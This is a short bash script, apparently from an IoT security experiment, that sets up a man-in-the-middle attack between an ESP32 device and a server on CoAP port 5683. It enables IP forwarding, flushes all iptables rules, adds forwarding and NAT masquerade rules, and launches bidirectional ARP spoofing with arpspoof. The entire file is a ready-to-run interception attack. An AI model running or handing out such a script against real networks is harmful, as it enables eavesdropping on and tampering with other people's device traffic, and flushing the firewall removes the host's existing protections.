#!/bin/bash

# Interface and IPs
INTERFACE="wlp0s20f3"
ESP32_IP="192.168.115.245"
SERVER_IP="192.168.115.142"
PORT="5683"

# Enable IP forwarding
echo "Enabling IP forwarding..."
sudo sysctl -w net.ipv4.ip_forward=1

# Flush existing rules
echo "Flushing existing iptables rules..."
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -P FORWARD ACCEPT

# Forwarding rules
echo "Setting up forwarding rules for port $PORT..."
sudo iptables -A FORWARD -p udp -s $ESP32_IP -d $SERVER_IP --dport $PORT -j ACCEPT
sudo iptables -A FORWARD -p udp -s $SERVER_IP -d $ESP32_IP --sport $PORT -j ACCEPT
sudo iptables -t nat -A POSTROUTING -o $INTERFACE -j MASQUERADE

# Start ARP spoofing
echo "Starting ARP spoofing..."
sudo arpspoof -i $INTERFACE -t $ESP32_IP $SERVER_IP &
sudo arpspoof -i $INTERFACE -t $SERVER_IP $ESP32_IP &

echo "MITM setup complete. Press Ctrl+C to stop."
wait
